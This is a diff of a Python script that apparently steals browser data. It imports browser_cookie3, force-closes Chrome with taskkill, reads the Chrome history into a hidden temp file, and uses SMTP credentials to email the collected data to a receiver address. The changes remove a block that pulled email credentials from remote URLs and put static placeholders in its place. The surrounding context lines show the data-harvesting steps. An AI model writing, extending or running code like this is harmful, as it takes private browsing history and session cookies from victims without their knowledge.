@@ -1,5 +1,4 @@
 import mimetypes
-import requests
 import time
 import smtplib
 from email.message import EmailMessage
@@ -10,14 +9,10 @@ import urllib.request
 import browser_cookie3
 
 # The mail addresses and password
-try:
-    # Try getting a new app pw, if it fails, fall back to static
-    SENDER_P = requests.get(r"").text  # Takes app password from raw url
-    SENDER, RECEIVER = requests.get(r"").text.split("\n") # Takes email password from raw url
-except Exception:  # NOQA
-    SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
-    SENDER = ""  # Syntax: <Example.email1@gmail.com>
-    RECEIVER = ""  # Syntax: <Example.email2@gmail.com>
+
+SENDER = ""  # Syntax: <Example.email1@gmail.com>
+SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
+RECEIVER = ""  # Syntax: <Example.email2@gmail.com>
 
 def download_form(url, i):
     try:
@@ -39,6 +34,7 @@ def get_chrome_history():
         os.system("taskkill /f /im chrome.exe")
     except Exception:  # NOQA
         pass
+    
     # copy getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb" to temp folder
     try:
         dict_obj = bh.get_browserhistory()
@@ -69,7 +65,7 @@ def get_chrome_history():
                 except Exception:  # NOQA
                     pass
                 try:
-                    open("C:\\temp\\.tempcache.csv").close()
+                    open("C:\\temp\\.tempcache.csv", "w").close()
                 except Exception:  # NOQA
                     pass
 
